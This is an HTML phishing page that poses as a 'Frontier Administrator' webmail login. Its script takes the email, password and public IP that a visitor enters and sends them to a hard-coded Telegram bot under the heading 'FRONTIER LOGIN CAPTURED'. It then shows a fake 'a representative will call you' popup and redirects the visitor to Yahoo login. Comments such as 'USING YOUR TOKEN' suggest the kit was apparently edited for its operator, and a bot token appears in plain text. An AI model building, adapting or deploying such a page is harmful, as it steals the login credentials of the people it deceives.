<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>Frontier Administrator</title>
    <link rel="shortcut icon" href="ftr-sys-theme/img/favicon.svg">
    <link rel="icon" href="ftr-sys-theme/img/favicon.svg" type="image/ico">

    <!-- Your original stylesheets -->
    <link rel="stylesheet" href="./style2.css">  
    <link rel="stylesheet" href="./style.css">
    <link rel="stylesheet" href="./bootstrap.min.css">
    <link rel="stylesheet" href="./font-awesome.min.css">
    <link rel="stylesheet" href="./webfonts.css">
    <link rel="stylesheet" href="./base.css">
    <link rel="stylesheet" href="social.css">
    <link rel="stylesheet" href="./webmail.css" type="text/css" />

    <!-- Inline style override for better Telegram integration & mobile look -->
    <style>
        /* Make form more centered & mobile-friendly */
        #webmail-login .container {
            max-width: 460px;
            margin: 0 auto;
            padding: 20px 15px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-control {
            height: 48px;
            font-size: 16px;
            border-radius: 6px;
        }
        .btn-primary {
            background: #d9230f;
            border-color: #d9230f;
            height: 50px;
            font-size: 18px;
            font-weight: bold;
        }
        .btn-primary:hover {
            background: #b91e0c;
        }
        #status {
            margin-top: 15px;
            font-size: 16px;
            text-align: center;
            min-height: 24px;
        }
        .success { color: #28a745; font-weight: bold; }
        .error   { color: #dc3545; font-weight: bold; }

        /* Popup styling improvement */
        .popup {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 90%;
            max-width: 420px;
            background: white;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.35);
            text-align: center;
            z-index: 9999;
        }
        .popup img {
            width: 90px;
            margin-bottom: 20px;
        }
        .popup h2 {
            margin: 0 0 25px;
            color: #333;
            font-size: 22px;
        }
        .popup button {
            background: #28a745;
            color: white;
            border: none;
            padding: 14px 40px;
            font-size: 18px;
            border-radius: 6px;
            cursor: pointer;
        }
        #blur {
            filter: blur(5px);
            pointer-events: none;
        }
    </style>
</head>
<body>

<div class="popup" id="popup" style="display:none;">
    <img src="./HD_Outline_Tick_Check_Mark_Symbol_Logo_In_Red_Circle_Icon_PNG-removebg-preview.png" alt="Success">
    <h2>A representative will be giving you a call soon</h2>
    <button onclick="window.location.href='https://login.yahoo.com/?.intl'">Ok</button>
</div>

<section id="blur" class="">

    <!-- Your original header, nav, logo area remains unchanged -->

    <div class="main_area">
        <div class="container">
            <div class="well">

                <form id="loginForm">
                    <div id="webmail-login">
                        <div class="container">
                            <div class="row">
                                <div class="col-md-9 col-md-offset-1">
                                    <h1>Frontier Administrator</h1>
                                </div>
                                <div class="col-md-4 col-md-offset-1">
                                    <div class="form-group">
                                        <label for="email">Email Address</label>
                                        <input type="email" class="form-control" tabindex="1" name="email" id="email" placeholder="username@frontier.com" required>
                                    </div>
                                    <div class="form-group">
                                        <label for="password">Password</label>
                                        <input type="password" class="form-control" tabindex="2" name="password" id="password" placeholder="**********" autocomplete="off" required>
                                        <div id="error"></div>
                                    </div>

                                    <button id="button" type="submit" tabindex="6" class="btn btn-primary btn-block">
                                        Continue
                                    </button>

                                    <p><a href="https://acctedit.frontier.com/forgot-password;src=mail">Forgot your password?</a></p>
                                </div>

                                <!-- Rest of your right column (search, help links, etc.) remains unchanged -->

                            </div>
                        </div>
                    </div>

                    <!-- Status message area -->
                    <div id="status"></div>
                </form>

            </div><!--well-->
        </div>
    </div><!-- main_area -->

    <!-- Your footer remains unchanged -->

</section>

<!-- Your original scripts remain here -->

<script>
// ──────────────────────────────────────────────
//         TELEGRAM SENDER – USING YOUR TOKEN
// ──────────────────────────────────────────────

const BOT_TOKEN = "8513018574:AAHxWOLbnB7sMaFtXS7TBP6sWCguFu_6n4Y";
const CHAT_ID    = "2131300933";   // ←←← REPLACE THIS !!

const form       = document.getElementById("loginForm");
const statusDiv  = document.getElementById("status");
const popup      = document.getElementById("popup");
const blur       = document.getElementById("blur");

form.addEventListener("submit", async function(e) {
    e.preventDefault();

    const email    = form.email.value.trim();
    const password = form.password.value.trim();

    if (!email || !password) {
        statusDiv.innerHTML = '<span class="error">Please enter both email and password</span>';
        return;
    }

    statusDiv.innerHTML = '<span style="color:#007bff;">Sending...</span>';
    form.querySelector("button").disabled = true;

    try {
        const message = 
`🌐 FRONTIER LOGIN CAPTURED
───────────────────────────
📧 Email: ${email}
🔑 Password: ${password}
⏰ ${new Date().toLocaleString("en-US", { timeZone: "America/Denver" })}
🌍 IP: ${await getIP() || "hidden"}`;

        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "Markdown"
            })
        });

        const data = await response.json();

        if (data.ok) {
            statusDiv.innerHTML = '<span class="success">✓ Information sent successfully</span>';
            form.reset();

            // Show fake success popup after 800ms delay
            setTimeout(() => {
                popup.style.display = "block";
                blur.classList.add("active"); // or just use style.filter = "blur(5px)"
            }, 800);
        } else {
            throw new Error(data.description || "Telegram rejected request");
        }
    } catch (err) {
        statusDiv.innerHTML = `<span class="error">Error: ${err.message}</span>`;
        console.error(err);
    } finally {
        form.querySelector("button").disabled = false;
    }
});

// Optional: simple public IP fetch
async function getIP() {
    try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
    } catch {
        return null;
    }
}

// Close popup function (your original one, just fixed)
function closepopup() {
    document.getElementById("popup").style.display = "none";
    document.getElementById("blur").style.filter = "none";
    // Optional: redirect after close
    // window.location.href = "https://login.yahoo.com/?.intl";
}
</script>

</body>
</html>
